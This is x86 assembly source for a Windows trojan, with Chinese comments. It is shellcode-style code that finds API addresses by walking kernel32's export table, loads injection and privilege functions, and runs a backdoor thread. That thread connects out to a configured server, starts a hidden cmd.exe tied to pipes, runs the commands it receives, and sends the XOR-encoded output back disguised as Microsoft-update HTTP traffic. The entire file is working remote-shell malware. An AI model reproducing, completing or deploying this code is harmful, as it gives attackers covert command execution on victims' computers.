include TrojanThread.INC

extrn	GetTickCount:PROC
extrn	LoadLibraryA:PROC
extrn	VirtualAlloc:PROC
extrn	GetProcAddress:PROC
extrn	CreateProcessA:PROC
extrn	ExitProcess:PROC

.586p
.model flat,stdcall

.data
;======================
ReliveThread:
	;获取eip
	call GetReliveEip
GetReliveEip:
	call GetReliveCurrentEip
GetReliveCurrentEip:
	pop ebx
	sub ebx, offset GetReliveCurrentEip - ReliveThread
	;建立堆栈		
	push ebp
	mov ebp, esp
	sub esp, ReliveThreadStackSize
	mov dword ptr [ebp-Eip], ebx
	;获取API
	call GetApiAddress	
	;向木马执行体中写入所需API地址
	mov ebx, dword ptr [ebp-Eip]	
	mov eax, offset tLoadLibraryA - offset ReliveThread
	add eax, ebx
	push dword ptr [ebp-xLoadLibraryA]
	pop dword ptr [eax] 

	mov eax, offset tCreateToolhelp32SnapShot - offset ReliveThread
	add eax, ebx
	push dword ptr [ebp-xCreateToolhelp32Snapshot]
	pop dword ptr [eax] 

	mov eax, offset tCreatePipe - offset ReliveThread
	add eax, ebx
	push dword ptr [ebp-xCreatePipe]
	pop dword ptr [eax] 	
	
	mov eax, offset tCreateProcessA - offset ReliveThread
	add eax, ebx
	push dword ptr [ebp-xCreateProcessA]
	pop dword ptr [eax] 		

	mov eax, offset tPeekNamedPipe - offset ReliveThread
	add eax, ebx
	push dword ptr [ebp-xPeekNamedPipe]
	pop dword ptr [eax] 		

	mov eax, offset tWriteFile - offset ReliveThread
	add eax, ebx
	push dword ptr [ebp-xWriteFile]
	pop dword ptr [eax] 		

	mov eax, offset tReadFile - offset ReliveThread
	add eax, ebx
	push dword ptr [ebp-xReadFile]
	pop dword ptr [eax] 			

	mov eax, offset tSleep - offset ReliveThread
	add eax, ebx
	push dword ptr [ebp-xSleep]
	pop dword ptr [eax]		

	mov eax, offset tlstrcpyA - offset ReliveThread
	add eax, ebx
	push dword ptr [ebp-xlstrcpyA]
	pop dword ptr [eax]			

	mov eax, offset tlstrcmpA - offset ReliveThread
	add eax, ebx
	push dword ptr [ebp-xlstrcmpA]
	pop dword ptr [eax]			

	mov eax, offset tlstrcatA - offset ReliveThread
	add eax, ebx
	push dword ptr [ebp-xlstrcatA]
	pop dword ptr [eax]			

	mov eax, offset tlstrlenA - offset ReliveThread
	add eax, ebx
	push dword ptr [ebp-xlstrlenA]
	pop dword ptr [eax]	

	mov eax,  offset tGetCurrentDirectoryA - offset ReliveThread
	add eax, ebx
	push dword ptr [ebp-xGetCurrentDirectoryA]
	pop dword ptr [eax]											
;ws2_32.dll		
	mov eax, offset tclosesocket - offset ReliveThread
	add eax, ebx
	push dword ptr [ebp-xclosesocket]
	pop dword ptr [eax]			

	mov eax, offset tinet_addr - offset ReliveThread
	add eax, ebx
	push dword ptr [ebp-xinet_addr]
	pop dword ptr [eax]			

	mov eax, offset trecv - offset ReliveThread
	add eax, ebx
	push dword ptr [ebp-xrecv]
	pop dword ptr [eax]		

	mov eax, offset tsend - offset ReliveThread
	add eax, ebx
	push dword ptr [ebp-xsend]
	pop dword ptr [eax]			

	mov eax, offset tconnect - offset ReliveThread
	add eax, ebx
	push dword ptr [ebp-xconnect]
	pop dword ptr [eax]			

	mov eax, offset thtons - offset ReliveThread
	add eax, ebx
	push dword ptr [ebp-xhtons]
	pop dword ptr [eax]			

	mov eax, offset taccept - offset ReliveThread
	add eax, ebx
	push dword ptr [ebp-xaccept]
	pop dword ptr [eax]			

	mov eax, offset tlisten - offset ReliveThread
	add eax, ebx
	push dword ptr [ebp-xlisten]
	pop dword ptr [eax]			

	mov eax, offset tsocket - offset ReliveThread
	add eax, ebx
	push dword ptr [ebp-xsocket]
	pop dword ptr [eax]			

	mov eax, offset tWSACleanup - offset ReliveThread
	add eax, ebx
	push dword ptr [ebp-xWSACleanup]
	pop dword ptr [eax]			

	mov eax, offset tWSAStartup - offset ReliveThread
	add eax, ebx
	push dword ptr [ebp-xWSAStartup]
	pop dword ptr [eax]
TrojanThread:
	;获取eip
	call GetTrojanEip
GetTrojanEip:
	call GetTrojanCurrentEip
GetTrojanCurrentEip:
	pop ebx
	sub ebx, offset GetTrojanCurrentEip - offset TrojanThread
	;建立堆栈		
	push ebp
	mov ebp, esp
	sub esp, TrojanThreadStackSize
	;储存eip
	mov dword ptr [ebp-TEip], ebx	
StartSocket:	
	lea eax, [ebp-TWSAData]
	push eax
	push 202h
	mov eax, offset tWSAStartup - offset TrojanThread
	add eax, dword ptr [ebp-TEip]
	call dword ptr [eax]		;WSAStartup
	test eax, eax
	jnz StartSocket	

	push IPPROTO_TCP
	push SOCK_STREAM
	push AF_INET
	mov eax, offset tsocket - offset TrojanThread
	add eax, dword ptr [ebp-TEip]
	call dword ptr [eax]		;socket
	cmp eax, INVALID_SOCKET
	jz StartSocket
	mov dword ptr [ebp-Ts], eax
	
	lea esi, [ebp-Taddr]
	mov ax, AF_INET
	mov word ptr [esi.sin_family], ax
	
	;mov eax, offset tPort - offset TrojanThread
	;add eax, dword ptr [ebp-TEip]
	;push word ptr [eax]
	push 80
	mov ebx, offset thtons - offset TrojanThread
	add ebx, dword ptr [ebp-TEip]
	call dword ptr [ebx]		;htons
	mov word ptr [esi.sin_port], ax
	
	mov eax, offset tIp - offset TrojanThread
	add eax, dword ptr [ebp-TEip]
	push eax					;ip address
	;call PushIPaddressStr
	;	db	'127.0.0.1',0,0,0,0,0,0,0,0
	;PushIPaddressStr:
	mov ebx, offset tinet_addr - offset TrojanThread
	add ebx, dword ptr [ebp-TEip]
	call dword ptr [ebx]		;inet_addr
	mov dword ptr [esi.sin_addr.S_un.S_addr], eax

LoopConnect:	
	push 0BB8h
	mov eax, offset tSleep - offset TrojanThread
	add eax, dword ptr [ebp-TEip]
	call dword ptr [eax]		;Sleep
	
	push size sockaddr_in
	lea eax, [ebp-Taddr]
	push eax
	push dword ptr [ebp-Ts]
	mov ebx, offset tconnect - offset TrojanThread
	add ebx, dword ptr [ebp-TEip]
	call dword ptr [ebx]		;connect
	test eax, eax
	jnz LoopConnect
	;建立管道1
	lea edi, [ebp-Tsa]
	mov ecx, size SECURITY_ATTRIBUTES
	xor eax, eax
	cld
	rep stosb

	mov eax, size SECURITY_ATTRIBUTES
	mov dword ptr [edi.nLength], eax
	xor eax, eax
	mov dword ptr [edi.lpSecurityDescriptor], eax
	inc eax
	mov dword ptr [edi.bInheritHandle], eax
	
	push 0
	push NULL
	lea eax, [ebp-ThWritePipe1]
	push eax
	lea eax, [ebp-ThReadPipe1]
	push eax
	mov eax, offset tCreatePipe - offset TrojanThread
	add eax, dword ptr [ebp-TEip]
	call dword ptr [eax]		;CreatePipe
	;建立管道2
	push 0
	push NULL
	lea eax, [ebp-ThWritePipe2]
	push eax
	lea eax, [ebp-ThReadPipe2]
	push eax
	mov eax, offset tCreatePipe - offset TrojanThread
	add eax, dword ptr [ebp-TEip]
	call dword ptr [eax]		;CreatePipe
	;开辟cmd
	;cmd从管道ThReadPipe1读取命令,从ThWritePipe2管道输出执行结果.
	;从管道ThWritePipe1输入命令,从ThReadPipe2管道读出执行结果.
CreateCmdProcess:
	lea edi, [ebp-Tsi]
	mov ecx, size STARTUPINFOA
	xor eax, eax
	cld
	rep stosb
	
	lea edi, [ebp-Tpi]
	mov ecx, size PROCESS_INFORMATION 
	xor eax, eax
	cld
	rep stosb
	
	xor eax, eax
	lea edi, [ebp-Tsi]
	mov eax, STARTF_USESHOWWINDOW + STARTF_USESTDHANDLES
	mov dword ptr [edi.dwFlagsSI], eax
	mov eax, dword ptr [ebp-ThReadPipe1]
	mov dword ptr [edi.hStdInput], eax
	mov eax, dword ptr [ebp-ThWritePipe2]
	mov dword ptr [edi.hStdError], eax
	mov dword ptr [edi.hStdOutput], eax
	mov ax, SW_HIDE
	mov word ptr [edi.wShowWindow], ax

	lea ebx, [ebp-Tpi]
	push ebx
	lea ebx, [ebp-Tsi]
	push ebx
	push NULL
	push NULL
	push 0
	push 1
	push NULL
	push NULL
	call PushCmdStr
		db	'cmd.exe',0
	PushCmdStr:
	push NULL
	mov eax, offset tCreateProcessA - offset TrojanThread
	add eax, dword ptr [ebp-TEip]
	call dword ptr [eax]	;CreateProcessA
	test eax, eax
	jz CreateCmdProcess	;当失败就重新创建
LoopHandleHackerData:
	;清空缓冲Buffer1与Buffer2
	lea edi, [ebp-TBuffer1]
	mov ecx, 0A00h
	xor eax, eax
	cld
	rep stosb

	;获取当前路径
	lea eax, [ebp-TBuffer1]
	push eax
	push TBufferSize
	mov eax, offset tGetCurrentDirectoryA - offset TrojanThread
	add eax, dword ptr [ebp-TEip]
	call dword ptr [eax]		;GetCurrentDirectoryA
	push eax
	push eax			;eax为当前目录的长度
	;复制提交URL头
	lea edi, [ebp-TBuffer2]
	mov esi, offset MURL - offset TrojanThread
	add esi, dword ptr [ebp-TEip]
	mov ecx, MURLHeadSize
	cld
	rep movsb
	;复制数据到TBuffer2,并在末尾添加'>'
	lea esi, [ebp-TBuffer1]
	pop ecx			;ecx中为目录字符数量
	cld
	xor eax, eax
Tmp1_TrojanThreadLoop:
	lodsb
	xor al, TKey
	stosb
	loop Tmp1_TrojanThreadLoop
	mov al, '>'
	xor al, TKey
	mov byte ptr [edi], al	;添加'>'
	;发送当前目录
	pop eax			;目录字符的数量
	push 0
	inc eax			;增加上>的数量
	add eax, MURLHeadSize	;加上URL头的长度
	push eax
	lea eax, [ebp-TBuffer2]
	push eax
	push dword ptr [ebp-Ts]
	mov eax, offset tsend - offset TrojanThread
	add eax, dword ptr [ebp-TEip]
	call dword ptr [eax]	;send	
	test eax, eax
	jz Tmp1_TrojanThreadLoop	;发送为0则重新发送
;====================
;接收数据
RecvData:
	;清空Buffer1和Buffer2
	lea edi, [ebp-TBuffer1]
	xor eax, eax
	mov ecx, 0A00h
	cld
	stosb

	push 0
	push TBufferSize
	lea eax, [ebp-TBuffer1]
	push eax
	push dword ptr [ebp-Ts]
	mov eax, offset trecv - TrojanThread
	add eax, dword ptr [ebp-TEip]
	call dword ptr [eax]		;recv
	test eax, eax
	jz RecvData			;如果什么也没有接受到,则继续接收
	;将命令处提取到Buffer2并解密
DeCodeCommand:
	lea esi, [ebp-TBuffer1]
	add esi, CommandHeadSize	;移动到加密命令处
	sub eax, CommandHeadSize	;获取命令长度
	push eax			;保存命令长度
	mov ecx, eax
	xor eax, eax
	lea edi, [ebp-TBuffer2]
	cld
	lodsb
	xor al, TKey
	stosb
	loop DeCodeCommand
	;将命令写入到CMD的管道
	pop ebx				;恢复命令长度
	push NULL
	lea eax, [ebp-TTmp]
	push eax
	push ebx
	lea eax, [ebp-TBuffer2]		;要执行的命令
	push eax
	push dword ptr [ebp-ThWritePipe1]
	mov eax, offset tWriteFile - offset TrojanThread
	add eax, dword ptr [ebp-TEip]
	call dword ptr [eax]		;WriteFile
;====================
;发送数据
SendData:
	;清空Buffer1
	lea edi, [ebp-TBuffer1]
	mov ecx, TBufferSize
	xor eax, eax
	cld
	stosb
	
	;读出命令执行结果到Buffer1
	push 0
	lea eax, [ebp-TTmp]
	push eax
	push TBuffer1
	lea eax, [ebp-TBuffer1]
	push eax
	push dword ptr [ebp-ThReadPipe2]
	mov eax, offset tReadFile - offset TrojanThread
	add eax, dword ptr [ebp-TEip]
	call dword ptr [eax]		;ReadFile
	;写入URL头
	lea edi, [ebp-TBuffer2]
	mov esi, offset CommandURL - offset TrojanThread
	add esi, dword ptr [ebp-TEip]
	mov ecx, CommandHeadSize
	cld
	rep movsb
	
	;加密输出结果
	lea esi, [ebp-TBuffer1]
	mov ecx, dword ptr [ebp-TTmp]
	xor eax, eax
	cld
EnCodeSendData:
	lodsb
	xor al, TKey
	stosb
	loop EnCodeSendData

	;发送输出结果
	push 0
	mov eax, CommandHeadSize
	add eax, dword ptr [ebp-TTmp]
	push eax
	lea eax, [ebp-TBuffer2]
	push eax
	push dword ptr [ebp-Ts]
	mov eax, offset tsend - offset TrojanThread
	add eax, dword ptr [ebp-TEip]
	call dword ptr [eax]		;send
	jmp RecvData			;转到接收数据继续执行
;====================
	jmp StartSocket
	mov esp, ebp
	pop ebp
	ret
;====================
;命令数据
CommandURL:
	db	'<h1>Bad Request (Invalid Verb)</h1>',10h
CommandURLHead:
;返回结构
MURL:
	db	'GET http://www.microsoft.com/updata/Search.aspx?displaylang=en&&upid=',0
MURLHead:
;所需IP与端口
tIp:
	db	 '127.0.0.1',0,0,0,0,0,0,0,0,0
;所需API
;kernel32.dll
tLoadLibraryA:
		dd	?
tCreateToolhelp32SnapShot:
		dd	?
tCreatePipe:
		dd	?
tCreateProcessA:
		dd	?			
tPeekNamedPipe:
		dd	?
tWriteFile:
		dd	?
tReadFile:
		dd	?
tSleep:
		dd	?
tlstrcpyA:
		dd	?
tlstrcmpA:
		dd	?
tlstrcatA:
		dd	?
tlstrlenA:
		dd	?
tGetCurrentDirectoryA:
		dd	?																				
;ws2_32.dll		
tclosesocket:
		dd	?
tinet_addr:
		dd	?
trecv:
		dd	?
tsend:
		dd	?
tconnect:
		dd	?
thtons:
		dd	?
taccept:
		dd	?
tlisten:
		dd	?
tsocket:
		dd	?
tWSACleanup:
		dd	?
tWSAStartup:
		dd	?																							
EndTrojanThread:

;获取API地址
GetApiAddress:
	call GetKeyApiAddress				;ebx中为GetProcAddress的地址 esi中为kernel32.dll的地址
	mov dword ptr [ebp-vRa1], esi			;kernel32.dll的句柄
	mov dword ptr [ebp-xGetProcAddress], ebx	;GetProcAddress
	;获取LoadLibraryA的地址
	call PushLoadLibraryAStr
		db	'LoadLibraryA',0
PushLoadLibraryAStr:
	push esi
	call dword ptr [ebp-xGetProcAddress]
	mov dword ptr [ebp-xLoadLibraryA], eax

	;获取advapi32.dll句柄
	call PushAdvapi32Str
		db	'advapi32.dll',0
PushAdvapi32Str:
	call dword ptr [ebp-xLoadLibraryA]
	mov dword ptr [ebp-vRa1], eax
	mov esi, dword ptr [ebp-vRa1]	
;======================
	lea edi, [ebp-14h]		
	call PushAdvapiStr
	mov eax, ecx
	imul eax, eax, 4
	sub edi, eax
	mov dword ptr [ebp-vRa2], edi		;保存edi所指
	mov ebx, ecx
	inc ebx
LoopGetAdvapiAddress:
	call dword ptr [ebp-xGetProcAddress], esi
	cld
	stosd
	dec ebx
	mov ecx, ebx 
	loop LoopGetAdvapiAddress

	;获取ws2_32.dll句柄
	call PushWs232DllStr
		db	'ws2_32.dll',0
PushWs232DllStr:
	call dword ptr [ebp-xLoadLibraryA]
	mov dword ptr [ebp-vRa1], eax
	mov esi, dword ptr [ebp-vRa1]	
;======================
	call PushWs232Str
	mov eax, ecx
	imul eax, eax, 4
	mov edi, dword ptr [ebp-vRa2]
	sub edi, eax
	mov dword ptr [ebp-vRa2], edi
	mov ebx, ecx
	inc ebx
LoopGetWs232apiAddress:
	call dword ptr [ebp-xGetProcAddress], esi
	cld
	stosd
	dec ebx
	mov ecx, ebx 
	loop LoopGetWs232apiAddress

	;获取kernel32.dll句柄
	call PushKnl232DllStr
		db	'kernel32.dll',0
PushKnl232DllStr:
	call dword ptr [ebp-xLoadLibraryA]
	mov dword ptr [ebp-vRa1], eax
	mov esi, dword ptr [ebp-vRa1]	
;======================
	call PushKnl32Str
	mov eax, ecx
	imul eax, eax, 4
	mov edi, dword ptr [ebp-vRa2]
	sub edi, eax
	mov ebx, ecx
	inc ebx
LoopGetKernel32apiAddress:
	call dword ptr [ebp-xGetProcAddress], esi
	cld
	stosd
	dec ebx
	mov ecx, ebx 
	loop LoopGetKernel32apiAddress
	ret
	
GetKeyApiAddress:
	push ebp
	mov ebp, esp
	cld
	xor esi, esi
	assume fs:nothing
	lods dword ptr fs:[esi]
Tmp1_GetKeyApiAddress:
	inc eax
	jz Tmp2_GetKeyApiAddress
	dec eax
	xchg esi, eax
	lodsd
	jmp short Tmp1_GetKeyApiAddress
Tmp2_GetKeyApiAddress:
	lodsd
	xchg esi, eax
Tmp3_GetKeyApiAddress:
	dec esi
	xor si, si
	mov eax, [esi]
	add ax, 0A5B3h
	jnz Tmp3_GetKeyApiAddress
	mov edi, [esi.PEHeaderOffset]
	mov eax, [esi+edi]
	add eax, 0FFFFBAB0h
	jnz Tmp3_GetKeyApiAddress
	mov dword ptr [ebp-04h], esi
	;查找GetProcess函数
	GetPeExportTable:
	mov edi, esi
	add edi, [esi.PEHeaderOffset]
	mov eax, [edi.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress]	;ExportsRVA
	add eax, esi
	mov dword ptr [ebp-08h], eax		;储存ExportsRVA的线性地址
	GetExportNameList:
	mov ebx, [eax.AddressOfNames]
	add ebx, esi
	xor eax, eax
	mov edx, esi
	LoopFindApiStr:
	add ebx, 04h
	inc eax
	mov edi, [ebx]
	add edi, edx
	call PushStrGetProcAddress
			db	'GetProcAddress',0
	PushStrGetProcAddress:
	pop esi
	xor ecx, ecx
	mov cl, 0Fh
	cld
	rep cmpsb
	jnz short LoopFindApiStr
	mov esi, edx
	mov ecx, eax
	mov eax, dword ptr [ebp-08h]
	mov ebx, [eax.AddressOfFunctions]		
	add ebx, esi
	mov ebx, [ebx+ecx*4]
	add ebx, esi
	;=====================
	mov esp, ebp
	pop ebp
	ret
;======================	
PushAdvapiStr:
	pop eax
	mov ecx, esp
	call PushAdvapi1
		db	'LookupPrivilegeValueA',0
PushAdvapi1:
	call PushAdvapi2
		db	'OpenThreadToken',0 
PushAdvapi2:
	call PushAdvapi3
		db	'OpenProcessToken',0
PushAdvapi3:
	call PushAdvapi4
		db	'GetTokenInformation',0
PushAdvapi4:
	call PushAdvapi5
		db	'AdjustTokenPrivileges',0
PushAdvapi5:
	call PushAdvapi6
		db	'LookupAccountSidA',0
PushAdvapi6:
	sub ecx, esp
	shr ecx, 2
	jmp eax
;======================
PushWs232Str:
	pop eax
	mov ecx, esp
	call PushWs232api1
		db	'closesocket',0
PushWs232api1:
	call PushWs232api2
		db	'inet_addr',0
PushWs232api2:
	call PushWs232api3
		db	'recv',0
PushWs232api3:
	call PushWs232api4
		db	'send',0
PushWs232api4:
	call PushWs232api5
		db	'connect',0
PushWs232api5:
	call PushWs232api6
		db	'htons',0
PushWs232api6:
	call PushWs232api7
		db	'accept',0
PushWs232api7:
	call PushWs232api8
		db	'listen',0
PushWs232api8:
	call PushWs232api9
		db	'socket',0
PushWs232api9:
	call PushWs232api10
		db	'WSACleanup',0
PushWs232api10:
	call PushWs232api11
		db	'WSAStartup',0
PushWs232api11:
	sub ecx, esp
	shr ecx, 2
	jmp eax
;======================
PushKnl32Str:
	pop eax
	mov ecx, esp
	call PushKnlStr1
		db	'CreateFileMappingA',0
PushKnlStr1:
	call PushKnlStr2
		db	'MapViewOfFile',0
PushKnlStr2:
	call PushKnlStr3
		db	'UnmapViewOfFile',0
PushKnlStr3:
	call PushKnlStr4
		db	'CloseHandle',0
PushKnlStr4:
	call PushKnlStr5
		db	'VirtualAlloc',0
PushKnlStr5:
	call PushKnlStr6
		db	'VirtualAllocEx',0
PushKnlStr6:
	call PushKnlStr7
		db	'OpenProcess',0
PushKnlStr7:
	call PushKnlStr8
		db	'WriteProcessMemory',0
PushKnlStr8:
	call PushKnlStr9
		db	'CreateRemoteThread',0
PushKnlStr9:
	call PushKnlStr10
		db	'ExitThread',0
PushKnlStr10:
	call PushKnlStr11
		db	'CreateToolhelp32Snapshot',0
PushKnlStr11:
	call PushKnlStr12
		db	'TerminateProcess',0
PushKnlStr12:
	call PushKnlStr13
		db	'PeekNamedPipe',0
PushKnlStr13:
	call PushKnlStr14
		db	'WriteFile',0
PushKnlStr14:
	call PushKnlStr15
		db	'ReadFile',0
PushKnlStr15:
	call PushKnlStr16
		db	'Sleep',0
PushKnlStr16:
	call PushKnlStr17
		db	'CreatePipe',0
PushKnlStr17:
	call PushKnlStr18
		db	'Process32First',0
PushKnlStr18:
	call PushKnlStr19
		db	'Process32Next',0
PushKnlStr19:
	call PushKnlStr20
		db	'GetCurrentThread',0
PushKnlStr20:
	call PushKnlStr21
		db	'GetVersion',0
PushKnlStr21:
	call PushKnlStr22
		db	'WaitForSingleObject',0
PushKnlStr22:
	call PushKnlStr23
		db	'lstrcatA',0
PushKnlStr23:
	call PushKnlStr24
		db	'lstrcmpA',0
PushKnlStr24:
	call PushKnlStr25
		db	'lstrcpyA',0
PushKnlStr25:
	call PushKnlStr26
		db	'lstrlenA',0
PushKnlStr26:
	call PushKnlStr27
		db	'CopyFileA',0
PushKnlStr27:
	call PushKnlStr28
		db	'DeleteFileA',0
PushKnlStr28:
	call PushKnlStr29
		db	'VirtualFree',0
PushKnlStr29:
	call PushKnlStr30
		db	'GetSystemDirectoryA',0
PushKnlStr30:
	call PushKnlStr31
		db	'MoveFileExA',0
PushKnlStr31:
	call PushKnlStr32
		db	'SetFilePointer',0
PushKnlStr32:
	call PushKnlStr33
		db	'SetEndOfFile',0
PushKnlStr33:
	call PushKnlStr34
		db	'GetFileSize',0
PushKnlStr34:
	call PushKnlStr35
		db	'FlushFileBuffers',0
PushKnlStr35:
	call PushKnlStr36
		db	'CreateFileA',0
PushKnlStr36:
	call PushKnlStr37
		db	'GetCurrentProcess',0
PushKnlStr37:
	call PushKnlStr38
		db	'GetTickCount',0
PushKnlStr38:	
	call PushKnlStr39
		db	'CreateProcessA',0
PushKnlStr39:	
	call PushKnlStr40
		db	'FreeLibrary',0
PushKnlStr40:
	call PushKnlStr41
		db	'ExitProcess',0		
PushKnlStr41:		
	call PushKnlStr42
		db	'GetCurrentDirectoryA',0
PushKnlStr42:		
	sub ecx, esp
	shr ecx, 2
	jmp eax
;======================		
EndGetApiAddress:
EndAll:
;======================
.code

Start:	
	
	mov ecx, offset EndAll - offset ReliveThread
	call VirtualAlloc, 0, ecx, 3000h, 40h
	mov ebx, eax
	mov edi, eax
	mov esi, offset ReliveThread
	mov ecx, offset EndAll - offset ReliveThread
	cld
	rep movsb
	call ebx
	call ExitProcess, 0
end Start